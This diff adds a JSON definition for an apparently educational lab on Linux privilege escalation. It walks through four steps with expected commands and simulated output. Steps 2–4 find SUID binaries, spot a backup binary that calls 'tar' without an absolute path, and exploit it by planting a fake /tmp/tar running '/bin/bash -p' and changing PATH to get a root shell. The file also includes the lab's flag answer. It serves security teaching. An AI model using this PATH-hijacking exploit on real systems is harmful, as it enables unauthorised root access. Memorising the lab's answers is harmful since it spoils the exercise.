@@ -1,0 +1,50 @@
+{
+  "id": "lab_privilege_escalation",
+  "title": "Linux Privilege Escalation",
+  "description": "Learn techniques to escalate privileges on Linux systems from a low-privileged user to root.",
+  "difficulty": "Advanced",
+  "duration": "35 min",
+  "category": "Linux Fundamentals",
+  "semester_level": 3,
+  "scenario": "You have gained initial access as a low-privileged user. Your goal is to escalate to root privileges.",
+  "environment": "terminal",
+  "tasks": [
+    {
+      "step": 1,
+      "title": "Check Current User",
+      "instruction": "First, verify your current user and groups.",
+      "hint": "Use id command",
+      "expected_command": "id",
+      "output": "uid=1001(webuser) gid=1001(webuser) groups=1001(webuser)",
+      "explanation": "You're running as 'webuser' with limited privileges. Time to find escalation vectors."
+    },
+    {
+      "step": 2,
+      "title": "Find SUID Binaries",
+      "instruction": "Search for SUID binaries that might be exploitable.",
+      "hint": "Use find command to locate SUID files",
+      "expected_command": "find / -perm -4000 -type f 2>/dev/null",
+      "output": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/local/bin/backup\n/usr/bin/mount\n/usr/bin/su",
+      "explanation": "Found an unusual SUID binary: /usr/local/bin/backup - this is worth investigating."
+    },
+    {
+      "step": 3,
+      "title": "Analyze Custom Binary",
+      "instruction": "Examine the custom backup binary for vulnerabilities.",
+      "hint": "Use strings to see what the binary does",
+      "expected_command": "strings /usr/local/bin/backup",
+      "output": "/lib64/ld-linux-x86-64.so.2\nlibc.so.6\nsystem\n__cxa_finalize\nsetuid\n__libc_start_main\nGLIBC_2.2.5\n_ITM_deregisterTMCloneTable\n_ITM_registerTMCloneTable\ntar -czf /tmp/backup.tar.gz /home\nBackup completed!",
+      "explanation": "The binary calls 'tar' without an absolute path - we can exploit this via PATH manipulation!"
+    },
+    {
+      "step": 4,
+      "title": "Exploit PATH Hijacking",
+      "instruction": "Create a malicious tar script and manipulate PATH to escalate privileges.",
+      "hint": "Create fake tar in /tmp and add to PATH",
+      "expected_command": "echo '/bin/bash -p' > /tmp/tar && chmod +x /tmp/tar && PATH=/tmp:$PATH /usr/local/bin/backup",
+      "output": "bash-5.0# id\nuid=1001(webuser) gid=1001(webuser) euid=0(root) groups=1001(webuser)\nbash-5.0# cat /root/flag.txt\nFLAG{ISC_PRIVESC_MASTER_2024}",
+      "explanation": "Successfully escalated to root using PATH hijacking on a vulnerable SUID binary!",
+      "flag": "FLAG{ISC_PRIVESC_MASTER_2024}"
+    }
+  ]
+}
